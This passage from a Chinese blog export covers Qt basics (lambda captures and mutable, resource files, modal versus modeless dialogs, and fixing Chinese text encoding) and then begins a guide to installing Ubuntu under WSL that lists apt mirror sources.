class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;widget.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_widget.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">Widget::<span class="built_in">Widget</span>(QWidget *parent)</span><br><span class="line">    : <span class="built_in">QWidget</span>(parent)</span><br><span class="line">    , <span class="built_in">ui</span>(<span class="keyword">new</span> Ui::Widget)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;<span class="built_in">setupUi</span>(<span class="keyword">this</span>);</span><br><span class="line">    QPushButton* btn1,*btn2;</span><br><span class="line">    btn1 = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    btn2 = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    btn1-&gt;<span class="built_in">setParent</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn2-&gt;<span class="built_in">setParent</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn1-&gt;<span class="built_in">setText</span>(<span class="string">&quot;按钮1&quot;</span>);</span><br><span class="line">    btn2-&gt;<span class="built_in">setText</span>(<span class="string">&quot;按钮2&quot;</span>);</span><br><span class="line">    btn2-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">0</span>);</span><br><span class="line">    btn1-&gt;<span class="built_in">show</span>();</span><br><span class="line">    btn2-&gt;<span class="built_in">show</span>();</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">    <span class="built_in">connect</span>(btn1, &amp;QPushButton::clicked, <span class="keyword">this</span>, [=]() <span class="keyword">mutable</span>&#123;</span><br><span class="line">        a += <span class="number">100</span>;</span><br><span class="line">        <span class="built_in">qDebug</span>() &lt;&lt; a;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, <span class="keyword">this</span>, [=]()&#123;</span><br><span class="line">        <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Widget::~<span class="built_in">Widget</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/009.png" class=""><p>此处我们使用了<code>=</code>的lambda表达式，但是似乎btn1的改变对于btn2没有影响。先前提到过<code>=</code>只是能够拷贝一个a，但是不能对其改变。</p><p>对于直接传递变量a，和&#x3D;类似，就是拷贝一个变量。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn1, &amp;QPushButton::clicked, <span class="keyword">this</span>, [a]() <span class="keyword">mutable</span>&#123;</span><br><span class="line">    a += <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; a;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, <span class="keyword">this</span>, [a]()&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其结果和<code>[=]</code>一样，<code>[=]</code>的范围更大，指定变量肯定范围小。<br><strong>mutable我们后面讲</strong></p><p>要想改变可以通过<code>&amp;</code>引用的方式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn1, &amp;QPushButton::clicked, <span class="keyword">this</span>, [&amp;]()&#123;</span><br><span class="line">    a += <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; a;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, <span class="keyword">this</span>, [&amp;]()&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/010.png" class=""><p>这里倒是改变了，但是如果你在connect后面在打印个a，嘿嘿，就会看到好玩的，原因就是有些东西先编译好了，局部变量也是在栈上操作的。</p><p>那么常见的还有通过this操作：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;widget.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_widget.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QPushButton&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QDebug&gt;</span></span></span><br><span class="line"></span><br><span class="line">Widget::<span class="built_in">Widget</span>(QWidget *parent)</span><br><span class="line">    : <span class="built_in">QWidget</span>(parent)</span><br><span class="line">    , <span class="built_in">ui</span>(<span class="keyword">new</span> Ui::Widget)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;<span class="built_in">setupUi</span>(<span class="keyword">this</span>);</span><br><span class="line">    QPushButton* btn1,*btn2;</span><br><span class="line">    btn1 = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    btn2 = <span class="keyword">new</span> QPushButton;</span><br><span class="line">    btn1-&gt;<span class="built_in">setParent</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn2-&gt;<span class="built_in">setParent</span>(<span class="keyword">this</span>);</span><br><span class="line">    btn1-&gt;<span class="built_in">setText</span>(<span class="string">&quot;按钮1&quot;</span>);</span><br><span class="line">    btn2-&gt;<span class="built_in">setText</span>(<span class="string">&quot;按钮2&quot;</span>);</span><br><span class="line">    btn2-&gt;<span class="built_in">move</span>(<span class="number">100</span>,<span class="number">0</span>);</span><br><span class="line">    btn1-&gt;<span class="built_in">show</span>();</span><br><span class="line">    btn2-&gt;<span class="built_in">show</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">    <span class="built_in">connect</span>(btn1, &amp;QPushButton::clicked, <span class="keyword">this</span>, [<span class="keyword">this</span>]()&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;a+=<span class="number">100</span>; </span><br><span class="line">        <span class="built_in">qDebug</span>() &lt;&lt; a;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, <span class="keyword">this</span>, [<span class="keyword">this</span>]()&#123;</span><br><span class="line">        <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Widget::~<span class="built_in">Widget</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/008.png" class=""><p>变量a添加在头文件了，变成类成员。所以通过this，我们让按钮1每按下一次就修改一次成员变量a的值，然后btn2打印出来的也是被修改过后的值。</p><blockquote><p>介么一看，其实lambda是不是感觉还挺简单。</p></blockquote><hr><h3 id="Lambda拓展"><a href="#Lambda拓展" class="headerlink" title="Lambda拓展"></a>Lambda拓展</h3><p>也就是之前提到的<code>mutable</code>这个东西。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn1, &amp;QPushButton::clicked, <span class="keyword">this</span>, [=]() <span class="keyword">mutable</span>&#123;</span><br><span class="line">    a += <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; a;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, <span class="keyword">this</span>, [=]()&#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; __LINE__ &lt;&lt; a;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用了<code>mutable</code>，如果不加，会有报错，提示a是一个只读变量，不能够被修改。<br><strong>所以第一个作用是会使得该“值捕获变量”的值，可以在被捕获的值的基础上进行变化。</strong></p><p><code>mutable-&gt;type&#123;&#125;()</code>的用法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ret = <span class="number">100</span>;</span><br><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;ret:&quot;</span> &lt;&lt; ret;</span><br><span class="line">ret = [&amp;]() <span class="keyword">mutable</span>-&gt;<span class="type">int</span>&#123;</span><br><span class="line">    ret *= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;();</span><br><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;ret:&quot;</span> &lt;&lt; ret;</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/012.png" class=""><p>这样一来，一些小算术什么的就可以通过表达式完成。<br>比如斐波那契数列</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x=<span class="number">0</span>,y=<span class="number">1</span>,z=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">    [](<span class="type">int</span>&amp; a,<span class="type">int</span>&amp; b)-&gt;<span class="type">int</span>&#123;</span><br><span class="line">    <span class="type">int</span> ret=a+b;</span><br><span class="line">    a=b;</span><br><span class="line">    b=ret;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; ret;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;(x,y)</span><br></pre></td></tr></table></figure><p>虽然写法可能让人不习惯哈哈</p><img src="/2021/09/06/qt/013.png" class=""><p><strong>它的作用我感觉就是让lambda设置返回值</strong></p><ol><li>-&gt;有这玩意才代表有返回值</li><li>-&gt;后面跟的是返回值类型</li><li>最后的()是调用函数，没有则不是，也就跟上面的相似</li></ol><p>而且吧，对于这个匿名表达式，比较实用的还是像咱这样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn, &amp;QPushButton::clicked, &amp;x_ming, [=]()&#123;</span><br><span class="line">    x_ming.<span class="built_in">love</span>(<span class="string">&quot;你好&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">connect</span>(&amp;x_ming, (<span class="built_in">void</span>(boy::*)(QString))&amp;boy::love, &amp;x_hong, (<span class="built_in">void</span>(gril::*)(QString))&amp;gril::ack_love);</span><br></pre></td></tr></table></figure><p>这样发个带参数的还好弄点</p><img src="/2021/09/06/qt/014.png" class=""><p>结果也能正常显示。就是会看到男孩说的话多了个双引号，咱传递的时候带双引号是为了表示字符串类型。而打印却多了双引号。<br>这是因为QString，是qt自己封装的，咱常用的字符串以右值形式存在时是<code>const char*</code>，想要去掉这个双引号，就是让QString转为char*类型。在文档里面可以搜到，Qstring有一个方法叫<code>toUtf8</code>返回的是一个QByteArray的字节数组应该是叫，然后搜索这个QByteArray，发现有个叫data的方法返回值是char*，那么就可以在头文件修改一下<br><code>qDebug() &lt;&lt; &quot;男孩:&quot; &lt;&lt; str.toUtf8().data() &lt;&lt; &quot; 女孩:hai&quot;;</code></p><img src="/2021/09/06/qt/015.png" class=""><p>此时在输出就没有双引号了。</p><p>lambda表达式还能代码变得简洁高效，比如咱之前写的按钮点击然后关闭窗口</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, <span class="keyword">this</span>, [=]()&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;<span class="built_in">close</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>并且，如果信号接收者是this，可以直接忽略不写</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(btn2, &amp;QPushButton::clicked, [=]()&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;<span class="built_in">close</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><hr><h2 id="ui文件"><a href="#ui文件" class="headerlink" title="ui文件"></a>ui文件</h2><p>这就是拖控件用的可视化操作。<br>其实里面好像算是个xml什么的配置信息，双击这个文件会跳到qt的设计师界面，然后就可以拖拽控件了，包括添加子控件的操作。<br>从代码上，我们一般都是要先定义一个控件，比如菜单栏，然后在往里面add菜单。可视化自然是省去了一些步骤。</p><img src="/2021/09/06/qt/019.png" class=""><blockquote><p>不过学习嘛，总是先苦后甜，不能说有方便的就不去了解了。</p></blockquote><hr><h2 id="资源文件添加"><a href="#资源文件添加" class="headerlink" title="资源文件添加"></a>资源文件添加</h2><p>先找到一个带图片或者音频啥的文件，拖到项目路径下，然后在qt里右击项目选择添加新文件</p><img src="/2021/09/06/qt/016.png" class=""><p>名字看着取，尽量有意义。</p><img src="/2021/09/06/qt/017.png" class=""><img src="/2021/09/06/qt/018.png" class=""><p>这里的前缀我们一般习惯用<code>/</code>就行了。<br>然后通过addfiles，去打开这个资源文件，那么他就会把这个路径加载进来。<br>资源文件最好最好最好跟项目打包，别搞什么外面的资源。</p><p>额改了下主题，还是黑色带点感觉哈哈，通过add files之后就能看到多了路径和图片，剩下的就是怎么用，随便举个例子。<br>用之前可以在ui文件下，拖一个Graphics view到窗口上，咱好设置图片。</p><img src="/2021/09/06/qt/021.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mainwindow.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_mainwindow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">MainWindow::<span class="built_in">MainWindow</span>(QWidget *parent)</span><br><span class="line">    : <span class="built_in">QMainWindow</span>(parent)</span><br><span class="line">    , <span class="built_in">ui</span>(<span class="keyword">new</span> Ui::MainWindow)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;<span class="built_in">setupUi</span>(<span class="keyword">this</span>);</span><br><span class="line">    QGraphicsScene* scene = <span class="keyword">new</span> QGraphicsScene;</span><br><span class="line">    scene-&gt;<span class="built_in">addPixmap</span>(QPixmap::<span class="built_in">fromImage</span>(<span class="built_in">QImage</span>(<span class="string">&quot;:/images/ASUS.png&quot;</span>)));</span><br><span class="line">    ui-&gt;graphicsView-&gt;<span class="built_in">setScene</span>(scene);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MainWindow::~<span class="built_in">MainWindow</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>从这里的加载资源文件路径可以看到，为什么要把前缀设置成斜杠，这也是比较通俗易懂的方式</strong></p><img src="/2021/09/06/qt/022.png" class=""><blockquote><p>额这里偷个懒没搞大小哈哈，只是说可以在这个控件里直接加载咱们的资源文件。随便演示一下</p></blockquote><hr><h2 id="模态对话框和非模态"><a href="#模态对话框和非模态" class="headerlink" title="模态对话框和非模态"></a>模态对话框和非模态</h2><p>其实可以一句话概括：</p><blockquote><p>模态对话框打开之后，你是没办法对后面的窗口进行操作的；反之，非模态不会独占这个操作，你仍可以对后面或者其他窗口进行操作。    ——首先基于一个软件</p></blockquote><p>模态对话框的场景一般都是一些配置修改，或者文件操作，这种对下层窗口有影响的肯定是要以模态对话框出现。<br>而软件中一般都会有一个版本提示的信息，那个就无关紧要，因为你改变其他的对他不会有啥影响。</p><p>一个小例子：<br>先创建个菜单吧，懒得搞按钮没意思。</p><img src="/2021/09/06/qt/023.png" class=""><p>注意，子菜单要先变成中文可以在属性的text修改</p><img src="/2021/09/06/qt/024.png" class=""><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;mainwindow.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ui_mainwindow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;QDialog&gt;</span></span></span><br><span class="line"></span><br><span class="line">MainWindow::<span class="built_in">MainWindow</span>(QWidget *parent)</span><br><span class="line">    : <span class="built_in">QMainWindow</span>(parent)</span><br><span class="line">    , <span class="built_in">ui</span>(<span class="keyword">new</span> Ui::MainWindow)</span><br><span class="line">&#123;</span><br><span class="line">    ui-&gt;<span class="built_in">setupUi</span>(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ui指向的这个控件名，在ui文件的这个控件属性中，有个objectname</span></span><br><span class="line">    <span class="built_in">connect</span>(ui-&gt;actionnew_file, &amp;QAction::triggered, <span class="keyword">this</span>, [=]()&#123;</span><br><span class="line">       QDialog <span class="built_in">dlg</span>(<span class="keyword">this</span>);</span><br><span class="line">       dlg.<span class="built_in">exec</span>();  <span class="comment">//模态化</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MainWindow::~<span class="built_in">MainWindow</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">delete</span> ui;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/09/06/qt/025.png" class=""><p>因为没有设置大小姑且这样看，建议自己尝试一下。</p><p>非模态的显示就是方法不同，不过因为我们设置在lambda中，所以生命周期结束得太快了会一闪而过，只能通过new到堆区上活的久一些。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">connect</span>(ui-&gt;actionnew_file, &amp;QAction::triggered, <span class="keyword">this</span>, [=]()&#123;</span><br><span class="line">    QDialog* dlg = <span class="keyword">new</span> <span class="built_in">QDialog</span>(<span class="keyword">this</span>);</span><br><span class="line">    dlg-&gt;<span class="built_in">show</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里比较有意思的是，因为非模态没有阻塞的效果，所以你新建可以创建好多个窗口。</p><ul><li>qt的dialog不止这一种</li><li>这个dialog其实还有挺多可以设置的</li></ul><hr><h2 id="关于中文乱码"><a href="#关于中文乱码" class="headerlink" title="关于中文乱码"></a>关于中文乱码</h2><blockquote><p>这里创建的项目的时候好像选了qmake编译，不知道是不是这个问题，cmake的区别暂时也不知道。除此之外就是选的msvc编译器，没准是这个的锅，因为微软就比较喜欢ANSI和UNICODE这俩，但是实际上utf-8大部分软件用的比较多。</p></blockquote><p>我们的配置一般是，编译器的语言按照china，或者system，对于windows地区选了中国那这俩就一样。<br>然后下面的textcode 一般也选system，这个选中文的化地下的工具栏会乱码挺恶心的。</p><p>然后就是给控件从代码上设置中文加了u8和什么修饰都无效的话，可以尝试下在.pro文件下加入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">##pro文件中，解决中文乱码</span><br><span class="line">msvc &#123;</span><br><span class="line">      QMAKE_CFLAGS += /utf-8</span><br><span class="line">      QMAKE_CXXFLAGS += /utf-8</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="未完结-待续"><a href="#未完结-待续" class="headerlink" title="未完结~待续"></a>未完结~待续</h2><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>瞎写就完事，不知道再翻在百度。<br>因为ui这种东西自己不做一遍或者不看看视频，理解起来就比较抽象；并且这个方法有很多，不是我这个初学者一句两句能说清的。<br>网上也有电子书看得进去也可以。</p>]]></content>
      
      
      <categories>
          
          <category> software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【ubuntu】windows子系统</title>
      <link href="/2021/08/28/WindowsSubSystem/"/>
      <url>/2021/08/28/WindowsSubSystem/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>对于linux而言，如非百分百要吃到显卡或者cpu的性能，一般可考虑虚拟机或者子系统</p><span id="more"></span><p>虚拟机最大的优点就是兼容性，可以直接上桌面版，而且不用过多的配置，只需要选择分配核心数硬盘大小运存等等，最后塞个镜像。<br>而子系统，wsl2据说是可以使用桌面版并且支持nvidia的功能，但最主要还是gui这种图形化的软件。但是对我而言子系统倒是不需要桌面，直接拿来用比较适合学习命令行。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><ul><li>系统：win10</li><li>linux子系统：ubuntu18.04.5 lts</li><li>cmd还是windows terminal都行，后者好像改名叫终端了</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="第一步：控制面板找到程序打开Linux子系统选项"><a href="#第一步：控制面板找到程序打开Linux子系统选项" class="headerlink" title="第一步：控制面板找到程序打开Linux子系统选项"></a>第一步：控制面板找到程序打开Linux子系统选项</h3><img src="/2021/08/28/WindowsSubSystem/000.png" class=""><p>建议重启，然后在去商店安装Ubuntu</p><hr><h3 id="第二步：商店下载子系统"><a href="#第二步：商店下载子系统" class="headerlink" title="第二步：商店下载子系统"></a>第二步：商店下载子系统</h3><img src="/2021/08/28/WindowsSubSystem/001.png" class=""><p>20和18的问题倒不是很大，喜欢新的就上新的。</p><hr><h3 id="第三步：下载个终端，可以忽略"><a href="#第三步：下载个终端，可以忽略" class="headerlink" title="第三步：下载个终端，可以忽略"></a>第三步：下载个终端，可以忽略</h3><img src="/2021/08/28/WindowsSubSystem/002.png" class=""><p>比较恶心的就是，商店搜索还是叫windows terminal，而不知道是不是系统问题选了中文，这个软件都叫终端了。</p><hr><h3 id="第四步：打开完成基础配置"><a href="#第四步：打开完成基础配置" class="headerlink" title="第四步：打开完成基础配置"></a>第四步：打开完成基础配置</h3><p>可以通过windows菜单找到<br>也可以直接搜索找到</p><p>问题不大，第一次打开默认是用cmd的。</p><img src="/2021/08/28/WindowsSubSystem/003.png" class=""><p>你需要配置用户名,记住不要太短，我记得好像有要求的<br>然后就是密码，输入的时候是不可见状态，两次输入都要一致，最后弹出信息即可。</p><hr><h3 id="第五步：用终端打开，喜欢cmd的无所谓"><a href="#第五步：用终端打开，喜欢cmd的无所谓" class="headerlink" title="第五步：用终端打开，喜欢cmd的无所谓"></a>第五步：用终端打开，喜欢cmd的无所谓</h3><img src="/2021/08/28/WindowsSubSystem/004.png" class=""><p>终端可以分页使用，不然打开多个窗口零零散散的麻烦。<br>而且字体有些东西改起来方便点哈哈。。也算是小小的美化病</p><hr><h3 id="第六步：换源"><a href="#第六步：换源" class="headerlink" title="第六步：换源"></a>第六步：换源</h3><p>为什么要换源，源是什么？<br>按照个人理解，源就相当于软件商店的服务器地址。<br>因默认是国外的源，所以下载软件还是更新都很慢，这个懂得都懂，你要有科技也无所谓。</p><p>清华源：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="meta"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="meta"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="meta"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="meta"># </span><span class="language-bash">deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br></pre></td></tr></table></figure><p>阿里云：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multivers</span><br></pre></td></tr></table></figure><p>中科大源：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 